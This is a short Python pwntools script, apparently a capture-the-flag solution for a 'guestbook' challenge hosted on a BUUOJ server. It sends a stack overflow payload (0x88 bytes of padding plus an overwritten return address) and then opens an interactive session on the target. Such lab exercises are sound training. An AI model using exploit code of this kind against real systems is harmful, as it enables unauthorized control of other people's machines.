from pwn import *

context.log_level = 'debug'
# io = process('guestbook')
io = remote('node4.buuoj.cn', 25764)

payload = cyclic(0x88) + p64(0x400620)
io.sendline(payload)
io.interactive()

